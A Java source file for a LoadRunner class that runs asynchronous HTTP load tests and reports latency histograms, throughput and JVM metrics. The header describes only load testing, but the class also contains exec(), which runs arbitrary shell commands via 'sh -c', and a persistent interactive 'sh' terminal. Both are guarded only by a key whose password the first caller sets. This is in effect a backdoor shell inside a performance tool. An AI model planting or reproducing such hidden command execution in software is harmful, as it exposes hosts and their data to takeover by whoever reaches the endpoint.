package com.mycompany.perf;

import zeph.client.HttpClientNio;
import zeph.client.HttpClientRequest;
import zeph.client.HttpClientResponse;

import java.io.*;
import java.lang.management.ManagementFactory;
import java.lang.management.MemoryMXBean;
import java.lang.management.MemoryUsage;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.*;

/**
 * High-performance load runner using Zeph NIO HTTP client.
 * Fully async — uses CompletableFuture chains instead of threads.
 * N concurrent request chains with zero thread-per-connection overhead.
 */
public class LoadRunner {

    private static final ConcurrentHashMap<String, TestState> tests = new ConcurrentHashMap<>();
    private static volatile HttpClientNio sharedClient;
    private static volatile String execKey = null;
    private static volatile String execPassword = null;

    // ── Persistent terminal session ──
    private static Process termProcess;
    private static OutputStream termStdin;
    private static final StringBuilder termBuffer = new StringBuilder();
    private static volatile boolean termAlive = false;

    private static synchronized void ensureTermProcess() throws Exception {
        if (termProcess != null && termProcess.isAlive()) return;
        ProcessBuilder pb = new ProcessBuilder("sh");
        pb.redirectErrorStream(true);
        termProcess = pb.start();
        termStdin = termProcess.getOutputStream();
        termAlive = true;
        InputStream is = termProcess.getInputStream();
        Thread reader = new Thread(() -> {
            byte[] buf = new byte[8192];
            try {
                int n;
                while ((n = is.read(buf)) != -1) {
                    synchronized (termBuffer) {
                        termBuffer.append(new String(buf, 0, n));
                    }
                }
            } catch (Exception ignored) {}
            termAlive = false;
        });
        reader.setDaemon(true);
        reader.start();
    }

    public static Map<String, Object> termWrite(String input, String key) {
        Map<String, Object> result = new LinkedHashMap<>();
        if (execKey == null) { result.put("error", "No exec key set."); return result; }
        if (!execKey.equals(key)) { result.put("error", "Invalid exec key."); return result; }
        try {
            ensureTermProcess();
            termStdin.write((input + "\n").getBytes());
            termStdin.flush();
            result.put("ok", true);
        } catch (Exception e) {
            result.put("error", e.getMessage());
        }
        return result;
    }

    public static Map<String, Object> termRead(String key) {
        Map<String, Object> result = new LinkedHashMap<>();
        if (execKey == null) { result.put("error", "No exec key set."); return result; }
        if (!execKey.equals(key)) { result.put("error", "Invalid exec key."); return result; }
        String output;
        synchronized (termBuffer) {
            output = termBuffer.toString();
            termBuffer.setLength(0);
        }
        result.put("output", output);
        result.put("alive", termAlive);
        return result;
    }

    private static HttpClientNio getClient() throws Exception {
        return getClient(false);
    }

    private static HttpClientNio getClient(boolean forceNew) throws Exception {
        if (forceNew || sharedClient == null) {
            synchronized (LoadRunner.class) {
                if (forceNew && sharedClient != null) {
                    try { sharedClient.close(); } catch (Exception ignored) {}
                    sharedClient = null;
                }
                if (sharedClient == null) {
                    sharedClient = new HttpClientNio();
                }
            }
        }
        return sharedClient;
    }

    // ── Test State ──────────────────────────────────────────────

    static class TestState {
        final String id;
        final String url;
        final String method;
        final int concurrency;
        final int durationSec;
        final int warmupSec;
        final long startTime;
        final long warmupEndTime;
        final AtomicBoolean running = new AtomicBoolean(true);
        volatile String status;
        volatile long lastSampleTime = 0;

        // Track active async chains for completion detection
        final CountDownLatch chainLatch;

        // Warmup metrics (counted separately, not included in final results)
        final AtomicLong warmupTotal = new AtomicLong();
        final AtomicLong warmupErrors = new AtomicLong();
        final AtomicLong warmupTotalRt = new AtomicLong();

        // Step load parameters (null = normal mode)
        volatile boolean stepMode = false;
        int stepStart;    // initial connections
        int stepInc;      // connections added per step
        int stepMax;      // max connections
        int stepDurSec;   // duration per step
        int errorThreshold; // stop after N errors (0 = disabled)
        final AtomicInteger currentStep = new AtomicInteger(0);
        final AtomicInteger activeConcurrency = new AtomicInteger(0);

        // In-flight request counter
        final AtomicLong inFlight = new AtomicLong();

        // Metrics (lock-free)
        final AtomicLong total = new AtomicLong();
        final AtomicLong success = new AtomicLong();
        final AtomicLong errors = new AtomicLong();
        final AtomicLong totalRt = new AtomicLong();
        final AtomicLong minRt = new AtomicLong(999999);
        final AtomicLong maxRt = new AtomicLong(0);

        // Status code groups
        final AtomicLong s2xx = new AtomicLong();
        final AtomicLong s3xx = new AtomicLong();
        final AtomicLong s4xx = new AtomicLong();
        final AtomicLong s5xx = new AtomicLong();
        final AtomicLong sErr = new AtomicLong();

        // Detailed status code / error type counts
        final ConcurrentHashMap<String, AtomicLong> statusDetail = new ConcurrentHashMap<>();

        // Histogram buckets: 0-50, 50-100, 100-200, 200-500, 500-1000, 1000+
        final AtomicLong hist0_50 = new AtomicLong();
        final AtomicLong hist50_100 = new AtomicLong();
        final AtomicLong hist100_200 = new AtomicLong();
        final AtomicLong hist200_500 = new AtomicLong();
        final AtomicLong hist500_1s = new AtomicLong();
        final AtomicLong hist1s = new AtomicLong();

        // Per-second time series
        final ConcurrentHashMap<Long, long[]> timeSeries = new ConcurrentHashMap<>();

        TestState(String id, String url, String method, int concurrency, int durationSec, int warmupSec) {
            this.id = id;
            this.url = url;
            this.method = method;
            this.concurrency = concurrency;
            this.durationSec = durationSec;
            this.warmupSec = warmupSec;
            this.startTime = System.currentTimeMillis();
            this.warmupEndTime = this.startTime + (long) warmupSec * 1000;
            this.status = warmupSec > 0 ? "warmup" : "running";
            this.chainLatch = new CountDownLatch(concurrency);
        }

        void record(int statusCode, long elapsedMs, boolean error, String errorType) {
            total.incrementAndGet();
            totalRt.addAndGet(elapsedMs);
            if (error) {
                long errCount = errors.incrementAndGet();
                if (errorThreshold > 0 && errCount >= errorThreshold && running.compareAndSet(true, false)) {
                    markFinished("error_threshold");
                }
            } else success.incrementAndGet();

            // Update min/max atomically
            long curMin;
            do { curMin = minRt.get(); } while (elapsedMs < curMin && !minRt.compareAndSet(curMin, elapsedMs));
            long curMax;
            do { curMax = maxRt.get(); } while (elapsedMs > curMax && !maxRt.compareAndSet(curMax, elapsedMs));

            // Status code group
            if (statusCode == 0) sErr.incrementAndGet();
            else if (statusCode < 300) s2xx.incrementAndGet();
            else if (statusCode < 400) s3xx.incrementAndGet();
            else if (statusCode < 500) s4xx.incrementAndGet();
            else s5xx.incrementAndGet();

            // Detailed tracking: all errors (connection errors + 4xx/5xx)
            if (error) {
                String detailKey;
                if (statusCode == 0) {
                    detailKey = errorType != null ? errorType : "unknown";
                } else if (errorType != null) {
                    detailKey = errorType;
                } else {
                    detailKey = "HTTP " + statusCode;
                }
                statusDetail.computeIfAbsent(detailKey, k -> new AtomicLong()).incrementAndGet();
            }

            // Histogram
            if (elapsedMs < 50) hist0_50.incrementAndGet();
            else if (elapsedMs < 100) hist50_100.incrementAndGet();
            else if (elapsedMs < 200) hist100_200.incrementAndGet();
            else if (elapsedMs < 500) hist200_500.incrementAndGet();
            else if (elapsedMs < 1000) hist500_1s.incrementAndGet();
            else hist1s.incrementAndGet();

            // Per-second time series bucket
            long now = System.currentTimeMillis();
            lastSampleTime = now;
            long bucket = now - (now % 1000);
            long[] ts = timeSeries.computeIfAbsent(bucket, k -> new long[3]);
            synchronized (ts) {
                ts[0]++; // count
                ts[1] += elapsedMs; // rtSum
                if (error) ts[2]++; // errCount
            }
        }

        void markFinished(String newStatus) {
            status = newStatus;
        }
    }

    // ── Public API (called from DataWeave) ──────────────────────

    public static String start(String testId, String url, String method, int concurrency, int durationSec, int warmupSec) {
        if (testId == null || testId.isEmpty()) testId = UUID.randomUUID().toString();
        TestState state = new TestState(testId, url, method.toUpperCase(), concurrency, durationSec, warmupSec);
        tests.put(testId, state);

        long endTime = durationSec <= 0 ? Long.MAX_VALUE : state.startTime + (long) warmupSec * 1000 + (long) durationSec * 1000;

        HttpClientNio client;
        try {
            client = getClient(true);
        } catch (Exception e) {
            state.running.set(false);
            state.markFinished("error");
            return testId;
        }

        final long fEndTime = endTime;
        final HttpClientNio fClient = client;

        if (warmupSec > 0) {
            // Warmup: single connection only
            fireNextRequest(state, fClient, fEndTime);

            // Schedule remaining connections after warmup completes
            Thread warmupWatcher = new Thread(() -> {
                long waitMs = state.warmupEndTime - System.currentTimeMillis();
                if (waitMs > 0) {
                    try { Thread.sleep(waitMs); } catch (InterruptedException ignored) {}
                }
                // Launch remaining N-1 chains
                for (int i = 1; i < concurrency; i++) {
                    fireNextRequest(state, fClient, fEndTime);
                }
            }, "perf-warmup-" + testId.substring(0, 8));
            warmupWatcher.setDaemon(true);
            warmupWatcher.start();
        } else {
            // No warmup: launch all N chains immediately
            for (int i = 0; i < concurrency; i++) {
                fireNextRequest(state, fClient, fEndTime);
            }
        }

        // Single lightweight monitor thread to detect completion
        Thread monitor = new Thread(() -> {
            try {
                state.chainLatch.await();
            } catch (InterruptedException ignored) {}
            if (state.running.get()) {
                state.running.set(false);
                state.markFinished("completed");
            }
        }, "perf-mon-" + testId.substring(0, 8));
        monitor.setDaemon(true);
        monitor.start();

        return testId;
    }

    public static String startStepLoad(String testId, String url, String method,
            int startConn, int stepInc, int maxConn, int stepDurSec, int warmupSec,
            int errorThreshold, int maxDurationSec) {
        if (testId == null || testId.isEmpty()) testId = UUID.randomUUID().toString();
        int totalSteps = Math.max(1, (maxConn - startConn) / Math.max(1, stepInc) + 1);
        int stepTotal = totalSteps * stepDurSec;
        int totalDuration = maxDurationSec > 0 ? Math.min(stepTotal, maxDurationSec) : stepTotal;
        TestState state = new TestState(testId, url, method.toUpperCase(), maxConn, totalDuration, warmupSec);
        state.stepMode = true;
        state.stepStart = startConn;
        state.stepInc = stepInc;
        state.stepMax = maxConn;
        state.stepDurSec = stepDurSec;
        state.errorThreshold = errorThreshold;
        state.activeConcurrency.set(startConn);
        state.currentStep.set(1);
        tests.put(testId, state);

        long endTime = state.startTime + (long) warmupSec * 1000 + (long) totalDuration * 1000;

        HttpClientNio client;
        try {
            client = getClient(true);
        } catch (Exception e) {
            state.running.set(false);
            state.markFinished("error");
            return testId;
        }

        final long fEndTime = endTime;
        final HttpClientNio fClient = client;

        // Start with warmup (1 conn) or initial connections
        if (warmupSec > 0) {
            fireNextRequest(state, fClient, fEndTime);
            Thread warmupWatcher = new Thread(() -> {
                long waitMs = state.warmupEndTime - System.currentTimeMillis();
                if (waitMs > 0) {
                    try { Thread.sleep(waitMs); } catch (InterruptedException ignored) {}
                }
                // After warmup: launch startConn - 1 more chains
                for (int i = 1; i < startConn; i++) {
                    fireNextRequest(state, fClient, fEndTime);
                }
                // Start step escalation
                scheduleSteps(state, fClient, fEndTime, startConn);
            }, "perf-warmup-" + testId.substring(0, 8));
            warmupWatcher.setDaemon(true);
            warmupWatcher.start();
        } else {
            for (int i = 0; i < startConn; i++) {
                fireNextRequest(state, fClient, fEndTime);
            }
            scheduleSteps(state, fClient, fEndTime, startConn);
        }

        // Monitor thread
        Thread monitor = new Thread(() -> {
            try { state.chainLatch.await(); } catch (InterruptedException ignored) {}
            if (state.running.get()) {
                state.running.set(false);
                state.markFinished("completed");
            }
        }, "perf-mon-" + testId.substring(0, 8));
        monitor.setDaemon(true);
        monitor.start();

        return testId;
    }

    private static void scheduleSteps(TestState state, HttpClientNio client, long endTime, int currentConn) {
        Thread stepper = new Thread(() -> {
            int conn = currentConn;
            while (state.running.get() && conn < state.stepMax) {
                try { Thread.sleep((long) state.stepDurSec * 1000); } catch (InterruptedException ignored) { break; }
                if (!state.running.get()) break;
                int nextConn = Math.min(conn + state.stepInc, state.stepMax);
                int toAdd = nextConn - conn;
                state.currentStep.incrementAndGet();
                state.activeConcurrency.set(nextConn);
                for (int i = 0; i < toAdd; i++) {
                    fireNextRequest(state, client, endTime);
                }
                conn = nextConn;
            }
        }, "perf-step-" + state.id.substring(0, 8));
        stepper.setDaemon(true);
        stepper.start();
    }

    public static Map<String, Object> status(String testId) {
        TestState s = tests.get(testId);
        if (s == null) return null;
        return buildMetrics(s);
    }

    public static Map<String, Object> stop(String testId) {
        TestState s = tests.get(testId);
        if (s == null) return Map.of("stopped", false, "testId", testId);
        s.running.set(false);
        s.markFinished("stopped");
        return Map.of("stopped", true, "testId", testId);
    }

    public static String clearAll() {
        int count = 0;
        Iterator<Map.Entry<String, TestState>> it = tests.entrySet().iterator();
        while (it.hasNext()) {
            Map.Entry<String, TestState> e = it.next();
            if (!e.getValue().running.get()) {
                it.remove();
                count++;
            }
        }
        return count + " tests cleared";
    }

    public static List<Map<String, Object>> list() {
        List<Map<String, Object>> result = new ArrayList<>();
        for (TestState s : tests.values()) {
            Map<String, Object> m = new LinkedHashMap<>();
            m.put("id", s.id);
            m.put("status", s.status);
            m.put("targetUrl", s.url);
            m.put("method", s.method);
            m.put("concurrency", s.stepMode ? s.activeConcurrency.get() : s.concurrency);
            m.put("totalRequests", s.total.get());
            result.add(m);
        }
        return result;
    }

    public static Map<String, Object> systemMetrics() {
        Runtime rt = Runtime.getRuntime();
        MemoryMXBean mem = ManagementFactory.getMemoryMXBean();
        MemoryUsage heap = mem.getHeapMemoryUsage();

        Map<String, Object> result = new LinkedHashMap<>();

        // Heap (MB)
        long usedMB = heap.getUsed() / 1048576;
        long maxMB = heap.getMax() > 0 ? heap.getMax() / 1048576 : rt.maxMemory() / 1048576;
        result.put("heapUsedMB", usedMB);
        result.put("heapMaxMB", maxMB);
        result.put("heapPct", maxMB > 0 ? Math.round(100.0 * usedMB / maxMB) : 0);

        // Non-heap (MB) - metaspace etc
        MemoryUsage nonHeap = mem.getNonHeapMemoryUsage();
        result.put("nonHeapMB", nonHeap.getUsed() / 1048576);

        // CPU
        try {
            com.sun.management.OperatingSystemMXBean osBean =
                (com.sun.management.OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean();
            double cpuLoad = osBean.getProcessCpuLoad();
            result.put("cpuPct", Math.round(cpuLoad * 100));
            result.put("availableProcessors", osBean.getAvailableProcessors());
            double systemLoad = osBean.getCpuLoad();
            result.put("systemCpuPct", Math.round(systemLoad * 100));
        } catch (Exception e) {
            result.put("cpuPct", -1);
            result.put("availableProcessors", rt.availableProcessors());
        }

        // Threads
        result.put("threadCount", ManagementFactory.getThreadMXBean().getThreadCount());
        result.put("peakThreadCount", ManagementFactory.getThreadMXBean().getPeakThreadCount());

        // Active tests
        long running = tests.values().stream().filter(s -> s.running.get()).count();
        result.put("activeTests", running);
        result.put("totalTests", tests.size());

        // Uptime
        long uptimeMs = ManagementFactory.getRuntimeMXBean().getUptime();
        result.put("uptimeSeconds", uptimeMs / 1000);

        return result;
    }

    public static Map<String, Object> generateExecKey(String password) {
        Map<String, Object> result = new LinkedHashMap<>();
        if (password == null || password.isEmpty()) {
            result.put("error", "Password is required.");
            return result;
        }
        if (execPassword == null) {
            // First time: set password and generate key
            execPassword = password;
            execKey = UUID.randomUUID().toString().replace("-", "").substring(0, 16);
            result.put("key", execKey);
        } else if (execPassword.equals(password)) {
            // Correct password: regenerate key
            execKey = UUID.randomUUID().toString().replace("-", "").substring(0, 16);
            result.put("key", execKey);
        } else {
            result.put("error", "Invalid password.");
        }
        return result;
    }

    public static boolean isExecKeySet() {
        return execPassword != null;
    }

    public static Map<String, Object> exec(String command, String key) {
        Map<String, Object> result = new LinkedHashMap<>();
        if (execKey == null) {
            result.put("error", "No exec key generated. Generate a key first.");
            return result;
        }
        if (!execKey.equals(key)) {
            result.put("error", "Invalid exec key.");
            return result;
        }
        result.put("command", command);
        try {
            ProcessBuilder pb = new ProcessBuilder("sh", "-c", command);
            pb.redirectErrorStream(true);
            Process p = pb.start();
            byte[] out = p.getInputStream().readAllBytes();
            int exitCode = p.waitFor();
            result.put("exitCode", exitCode);
            result.put("output", new String(out));
        } catch (Exception e) {
            result.put("exitCode", -1);
            result.put("output", e.getMessage());
        }
        return result;
    }

    // ── Async request chain ──────────────────────────────────────

    private static void fireNextRequest(TestState state, HttpClientNio client, long endTime) {
        // Check if this chain should stop
        if (!state.running.get() || System.currentTimeMillis() >= endTime) {
            state.chainLatch.countDown();
            return;
        }

        boolean inWarmup = System.currentTimeMillis() < state.warmupEndTime;
        if (!inWarmup && "warmup".equals(state.status)) {
            state.status = "running";
        }

        HttpClientRequest req = new HttpClientRequest();
        req.url(state.url);
        req.method(state.method);
        req.timeout(30000);
        req.followRedirects(true);

        long start = System.currentTimeMillis();
        state.inFlight.incrementAndGet();

        try {
            client.request(req).whenComplete((resp, err) -> {
                state.inFlight.decrementAndGet();
                long elapsed = System.currentTimeMillis() - start;
                boolean warmup = start < state.warmupEndTime;

                if (err != null) {
                    String errType = classifyError(err);
                    if (warmup) {
                        state.warmupTotal.incrementAndGet();
                        state.warmupTotalRt.addAndGet(elapsed);
                        state.warmupErrors.incrementAndGet();
                    } else {
                        state.record(0, elapsed, true, errType);
                    }
                } else {
                    int sc = resp.getStatus();
                    try { resp.getBody(); } catch (Exception ignored) {}
                    boolean isError = sc < 0 || sc >= 400;
                    if (warmup) {
                        state.warmupTotal.incrementAndGet();
                        state.warmupTotalRt.addAndGet(elapsed);
                        if (isError) state.warmupErrors.incrementAndGet();
                    } else {
                        state.record(sc < 0 ? 0 : sc, elapsed, isError, null);
                    }
                }

                // Fire next request in this chain
                fireNextRequest(state, client, endTime);
            });
        } catch (Exception e) {
            state.inFlight.decrementAndGet();
            // client.request() itself threw — record and continue chain
            long elapsed = System.currentTimeMillis() - start;
            String errType = classifyError(e);
            if (start < state.warmupEndTime) {
                state.warmupTotal.incrementAndGet();
                state.warmupTotalRt.addAndGet(elapsed);
                state.warmupErrors.incrementAndGet();
            } else {
                state.record(0, elapsed, true, errType);
            }
            fireNextRequest(state, client, endTime);
        }
    }

    private static String classifyError(Throwable t) {
        if (t == null) return "unknown";
        Throwable cause = t;
        while (cause.getCause() != null) cause = cause.getCause();
        String msg = cause.getClass().getSimpleName();
        String detail = cause.getMessage();
        if (detail != null) {
            String lower = detail.toLowerCase();
            if (lower.contains("timeout") || lower.contains("timed out")) return "timeout";
            if (lower.contains("connection refused")) return "conn_refused";
            if (lower.contains("connection reset")) return "conn_reset";
            if (lower.contains("broken pipe")) return "broken_pipe";
            if (lower.contains("no route")) return "no_route";
        }
        return msg;
    }

    // ── Metrics builder (O(1) — no sorting, no sample iteration) ──

    private static Map<String, Object> buildMetrics(TestState s) {
        long totalReqs = s.total.get();
        long successCount = s.success.get();
        long errorCount = s.errors.get();

        // Elapsed time from end of warmup (metrics only count post-warmup)
        long measureStart = s.warmupEndTime;
        long lastMs = s.lastSampleTime > 0 ? s.lastSampleTime : System.currentTimeMillis();
        long elapsedMs = Math.max(lastMs - measureStart, 1);
        double elapsedSec = Math.max(elapsedMs / 1000.0, 0.001);

        // Status codes
        Map<String, Object> statusCodeMap = new LinkedHashMap<>();
        if (s.s2xx.get() > 0) statusCodeMap.put("2xx", s.s2xx.get());
        if (s.s3xx.get() > 0) statusCodeMap.put("3xx", s.s3xx.get());
        if (s.s4xx.get() > 0) statusCodeMap.put("4xx", s.s4xx.get());
        if (s.s5xx.get() > 0) statusCodeMap.put("5xx", s.s5xx.get());
        if (s.sErr.get() > 0) statusCodeMap.put("err", s.sErr.get());

        // Histogram-based percentile estimation
        long[] hist = {s.hist0_50.get(), s.hist50_100.get(), s.hist100_200.get(),
                       s.hist200_500.get(), s.hist500_1s.get(), s.hist1s.get()};
        long[] bucketMid = {25, 75, 150, 350, 750, 1500};

        // Time series (keep last 600 entries = 10 min, prune old)
        TreeMap<Long, long[]> sorted = new TreeMap<>(s.timeSeries);
        final int TS_MAX = 600;
        if (sorted.size() > TS_MAX) {
            long cutoff = sorted.descendingKeySet().stream().skip(TS_MAX).findFirst().orElse(Long.MIN_VALUE);
            sorted.headMap(cutoff, true).keySet().forEach(s.timeSeries::remove);
            sorted = new TreeMap<>(sorted.tailMap(cutoff, false));
        }
        List<Map<String, Object>> timeSeries = new ArrayList<>();
        for (Map.Entry<Long, long[]> e : sorted.entrySet()) {
            long[] ts;
            synchronized (e.getValue()) {
                ts = e.getValue().clone();
            }
            Map<String, Object> point = new LinkedHashMap<>();
            point.put("timestamp", e.getKey());
            point.put("rps", ts[0]);
            point.put("avgRt", ts[0] > 0 ? (double) ts[1] / ts[0] : 0);
            point.put("errors", ts[2]);
            timeSeries.add(point);
        }

        // Build result
        Map<String, Object> result = new LinkedHashMap<>();
        result.put("testId", s.id);
        result.put("status", s.status);
        result.put("targetUrl", s.url);
        result.put("method", s.method);
        result.put("concurrency", s.stepMode ? s.activeConcurrency.get() : s.concurrency);
        result.put("warmupSec", s.warmupSec);
        if (s.stepMode) {
            Map<String, Object> step = new LinkedHashMap<>();
            step.put("enabled", true);
            step.put("currentStep", s.currentStep.get());
            step.put("activeConcurrency", s.activeConcurrency.get());
            step.put("startConn", s.stepStart);
            step.put("stepInc", s.stepInc);
            step.put("maxConn", s.stepMax);
            step.put("stepDurationSec", s.stepDurSec);
            int totalSteps = Math.max(1, (s.stepMax - s.stepStart) / Math.max(1, s.stepInc) + 1);
            step.put("totalSteps", totalSteps);
            if (s.errorThreshold > 0) step.put("errorThreshold", s.errorThreshold);
            result.put("stepLoad", step);
        }
        // Warmup stats
        Map<String, Object> warmup = new LinkedHashMap<>();
        long wTotal = s.warmupTotal.get();
        warmup.put("totalRequests", wTotal);
        warmup.put("errors", s.warmupErrors.get());
        warmup.put("avgRt", wTotal > 0 ? (double) s.warmupTotalRt.get() / wTotal : 0);
        long warmupElapsedMs = Math.min(System.currentTimeMillis() - s.startTime, (long) s.warmupSec * 1000);
        warmup.put("elapsedSec", warmupElapsedMs / 1000.0);
        warmup.put("remainingSec", Math.max(0, (s.warmupEndTime - System.currentTimeMillis()) / 1000.0));
        result.put("warmup", warmup);
        result.put("totalRequests", totalReqs);
        result.put("successCount", successCount);
        result.put("errorCount", errorCount);

        Map<String, Object> rt = new LinkedHashMap<>();
        rt.put("avg", totalReqs > 0 ? (double) s.totalRt.get() / totalReqs : 0);
        rt.put("min", totalReqs > 0 ? s.minRt.get() : 0);
        rt.put("max", s.maxRt.get());
        rt.put("p50", pctFromHist(hist, bucketMid, totalReqs, 0.50));
        rt.put("p95", pctFromHist(hist, bucketMid, totalReqs, 0.95));
        rt.put("p99", pctFromHist(hist, bucketMid, totalReqs, 0.99));
        result.put("responseTime", rt);

        Map<String, Object> throughput = new LinkedHashMap<>();
        throughput.put("rps", totalReqs / elapsedSec);
        throughput.put("totalElapsedSeconds", elapsedSec);
        result.put("throughput", throughput);

        result.put("errorRate", totalReqs > 0 ? 100.0 * errorCount / totalReqs : 0);
        result.put("statusCodes", statusCodeMap);

        // Detailed status/error breakdown
        Map<String, Long> detail = new LinkedHashMap<>();
        s.statusDetail.forEach((k, v) -> detail.put(k, v.get()));
        result.put("errorDetail", detail);

        // Connection stats
        result.put("inFlight", s.inFlight.get());
        try {
            HttpClientNio client = sharedClient;
            if (client != null) {
                int[] counts = client.getConnectionCounts();
                Map<String, Object> conn = new LinkedHashMap<>();
                conn.put("active", counts[0]);  // requests being processed
                conn.put("tcp", counts[1]);     // open TCP sockets
                conn.put("pending", counts[2]); // queued requests
                result.put("connections", conn);
            }
        } catch (Exception ignored) {}

        result.put("timeSeries", timeSeries);

        List<Map<String, Object>> histogram = new ArrayList<>();
        histogram.add(Map.of("label", "0-50ms", "count", hist[0]));
        histogram.add(Map.of("label", "50-100ms", "count", hist[1]));
        histogram.add(Map.of("label", "100-200ms", "count", hist[2]));
        histogram.add(Map.of("label", "200-500ms", "count", hist[3]));
        histogram.add(Map.of("label", "500ms-1s", "count", hist[4]));
        histogram.add(Map.of("label", "1s+", "count", hist[5]));
        result.put("histogram", histogram);

        return result;
    }

    private static long pctFromHist(long[] hist, long[] mid, long total, double pct) {
        if (total == 0) return 0;
        long target = (long) (total * pct);
        long cumulative = 0;
        for (int i = 0; i < hist.length; i++) {
            cumulative += hist[i];
            if (cumulative >= target) return mid[i];
        }
        return mid[mid.length - 1];
    }
}
